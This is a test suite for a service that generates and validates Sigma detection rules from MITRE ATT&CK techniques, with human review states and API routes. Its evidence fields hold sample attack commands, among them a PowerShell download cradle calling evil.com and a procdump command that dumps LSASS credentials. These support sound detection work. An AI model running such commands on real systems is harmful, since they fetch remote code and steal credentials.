"""
Unit and Integration Tests for SigmaHQ Detection Engineering
Phase 12B Implementation Verification Suite

Validates:
- Requirement B1: SigmaHQ v2.1.0 specification compliance using pySigma
- Requirement B2: Evidence-grounded generation from MITRE ATT&CK and D3FEND
- Requirement B3: Zero detection condition schema pollution (sidecar isolation)
- Requirement B4: pySigma validation pipeline (valid/invalid rules, error reporting)
- Requirement B5: Human review state machine (draft -> under_review -> approved / rejected)
- Requirement B6: REST API endpoints for detection engineering
"""

from fastapi.testclient import TestClient
import yaml

from app.main import app
from app.models.sigma import SigmaRuleGenerateRequest, SigmaRuleReviewRequest
from app.services.detection.sigma_generation_service import SigmaGenerationService
from app.services.detection.sigma_repository import SigmaRepository
from app.services.detection.sigma_validation_service import SigmaValidationService

client = TestClient(app)


# ---------------------------------------------------------------------------
# REQUIREMENT B1 & B2: EVIDENCE-GROUNDED RULE GENERATION
# ---------------------------------------------------------------------------

def test_b1_b2_evidence_grounded_sigma_generation():
    """
    Generates a Sigma rule from technique T1059.001 (PowerShell) and evidence text.
    Verifies MITRE ATT&CK tags, D3FEND countermeasure mappings, and clean logsource.
    """
    gen_service = SigmaGenerationService()
    req = SigmaRuleGenerateRequest(
        technique_id="T1059.001",
        technique_name="PowerShell",
        evidence_text="powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA...",
        graph_node_ids=["technique--T1059.001", "malware--darkside"],
        level="high",
    )

    rule = gen_service.generate_rule(req)

    assert rule.title.startswith("Suspicious Activity Grounded in PowerShell")
    assert rule.level == "high"
    assert rule.status == "experimental"
    assert "attack.execution" in rule.tags
    assert "attack.t1059.001" in rule.tags
    assert rule.logsource.category == "process_creation"
    assert rule.logsource.product == "windows"

    # Verify detection block has clean selection and condition
    assert "selection" in rule.detection
    assert rule.detection["condition"] == "selection"

    # Verify D3FEND mapping in provenance
    assert rule.threatmind_provenance is not None
    assert any("D3-PA" in cm or "D3-PSA" in cm for cm in rule.threatmind_provenance.d3fend_countermeasures)
    assert rule.threatmind_provenance.review_status == "draft"


# ---------------------------------------------------------------------------
# REQUIREMENT B3: ZERO DETECTION CONDITION SCHEMA POLLUTION
# ---------------------------------------------------------------------------

def test_b3_zero_detection_condition_schema_pollution():
    """
    Verifies that the detection condition block contains ONLY valid Sigma selection tokens.
    ThreatMind evidence lineage is strictly isolated inside the 'threatmind_provenance' sidecar.
    """
    gen_service = SigmaGenerationService()
    val_service = SigmaValidationService()

    req = SigmaRuleGenerateRequest(
        technique_id="T1059.001",
        technique_name="PowerShell",
        evidence_text="Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
    )
    rule = gen_service.generate_rule(req)
    assert rule.raw_yaml is not None

    parsed = yaml.safe_load(rule.raw_yaml)
    detection = parsed["detection"]

    # Condition must be clean
    assert detection["condition"] == "selection"
    assert "threatmind" not in str(detection["condition"]).lower()
    assert "provenance" not in str(detection["condition"]).lower()

    # Provenance exists at top level sidecar, not inside detection
    assert "threatmind_provenance" in parsed
    assert "threatmind_provenance" not in detection

    # Validate using pySigma
    val_res = val_service.validate_yaml(rule.raw_yaml)
    assert val_res["is_valid"] is True
    assert len(val_res["errors"]) == 0


def test_b3_schema_pollution_rejected_by_validator():
    """
    Ensures that if ThreatMind metadata is injected into the detection condition,
    the validator flags it as schema pollution.
    """
    val_service = SigmaValidationService()
    polluted_yaml = """
title: Polluted Detection Rule
id: 5b5978a2-2591-4475-bf51-c0a6b7d5bf2a
status: experimental
description: Demonstrates schema pollution
author: ThreatMind
date: 2026/02/15
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
    condition: selection and threatmind_provenance_confidence > 0.8
"""
    val_res = val_service.validate_yaml(polluted_yaml)
    assert val_res["is_valid"] is False
    assert any("schema pollution" in err.lower() for err in val_res["errors"])


# ---------------------------------------------------------------------------
# REQUIREMENT B4: pySigma VALIDATION PIPELINE
# ---------------------------------------------------------------------------

def test_b4_pysigma_validation_pipeline_catches_invalid_syntax():
    """
    Validates that missing required fields or invalid YAML are detected.
    """
    val_service = SigmaValidationService()

    # Missing required 'logsource'
    invalid_yaml = """
title: Incomplete Rule
id: 11112222-3333-4444-5555-666677778888
status: experimental
description: Missing logsource
level: high
detection:
    selection:
        CommandLine|contains: 'test'
    condition: selection
"""
    val_res = val_service.validate_yaml(invalid_yaml)
    assert val_res["is_valid"] is False
    assert any("logsource" in err for err in val_res["errors"])

    # Invalid status
    invalid_status_yaml = """
title: Bad Status Rule
id: 11112222-3333-4444-5555-666677778888
status: super_active
description: Invalid status value
author: Test
date: 2026/02/15
level: high
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'test'
    condition: selection
"""
    val_res2 = val_service.validate_yaml(invalid_status_yaml)
    assert val_res2["is_valid"] is False
    assert any("status" in err.lower() for err in val_res2["errors"])


# ---------------------------------------------------------------------------
# REQUIREMENT B5: HUMAN REVIEW & APPROVAL WORKFLOW
# ---------------------------------------------------------------------------

def test_b5_human_review_workflow_state_transitions():
    """
    Validates state machine transitions for analyst review:
    draft -> under_review -> approved / rejected.
    """
    repo = SigmaRepository()
    gen_service = SigmaGenerationService()

    rule = gen_service.generate_rule(
        SigmaRuleGenerateRequest(
            technique_id="T1003",
            technique_name="OS Credential Dumping",
            evidence_text="procdump.exe -ma lsass.exe lsass.dmp",
        )
    )
    repo.save_rule(rule)

    assert rule.threatmind_provenance.review_status == "draft"

    # Transition: draft -> under_review
    rev1 = repo.update_review_status(
        rule_id=rule.id,
        new_status="under_review",
        reviewer="senior_analyst_alice",
        notes="Reviewing rule logic against internal baseline.",
    )
    assert rev1.threatmind_provenance.review_status == "under_review"
    assert rev1.threatmind_provenance.reviewed_by == "senior_analyst_alice"
    assert len(rev1.threatmind_provenance.review_notes) == 1

    # Transition: under_review -> approved
    rev2 = repo.update_review_status(
        rule_id=rule.id,
        new_status="approved",
        reviewer="lead_engineer_bob",
        notes="Approved for detection pipeline staging.",
    )
    assert rev2.threatmind_provenance.review_status == "approved"
    assert rev2.threatmind_provenance.reviewed_by == "lead_engineer_bob"
    assert len(rev2.threatmind_provenance.review_notes) == 2


# ---------------------------------------------------------------------------
# REQUIREMENT B6: DETECTION API ENDPOINTS
# ---------------------------------------------------------------------------

def test_b6_detection_api_routes():
    """
    Tests REST API endpoints:
    - POST /api/v1/detection/rules/generate
    - GET /api/v1/detection/rules
    - GET /api/v1/detection/rules/{id}
    - POST /api/v1/detection/rules/{id}/review
    - POST /api/v1/detection/rules/validate
    """
    # 1. Generate Rule
    gen_payload = {
        "technique_id": "T1059.001",
        "technique_name": "PowerShell Cradle",
        "evidence_text": "powershell.exe -enc IEX (New-Object Net.WebClient).DownloadString",
        "level": "high",
    }
    gen_res = client.post("/api/v1/detection/rules/generate", json=gen_payload)
    assert gen_res.status_code == 201
    rule_data = gen_res.json()
    rule_id = rule_data["id"]
    assert rule_data["threatmind_provenance"]["review_status"] == "draft"

    # 2. Get Rule by ID
    get_res = client.get(f"/api/v1/detection/rules/{rule_id}")
    assert get_res.status_code == 200
    assert get_res.json()["id"] == rule_id

    # 3. List Rules
    list_res = client.get("/api/v1/detection/rules?technique_id=T1059")
    assert list_res.status_code == 200
    assert any(r["id"] == rule_id for r in list_res.json())

    # 4. Review Rule
    review_payload = {
        "review_status": "approved",
        "reviewer": "analyst_carol",
        "notes": "Verified against test lab telemetries.",
    }
    rev_res = client.post(f"/api/v1/detection/rules/{rule_id}/review", json=review_payload)
    assert rev_res.status_code == 200
    assert rev_res.json()["threatmind_provenance"]["review_status"] == "approved"

    # 5. Validate Rule via API
    val_payload = {
        "yaml_content": rule_data["raw_yaml"],
    }
    val_res = client.post("/api/v1/detection/rules/validate", json=val_payload)
    assert val_res.status_code == 200
    assert val_res.json()["is_valid"] is True
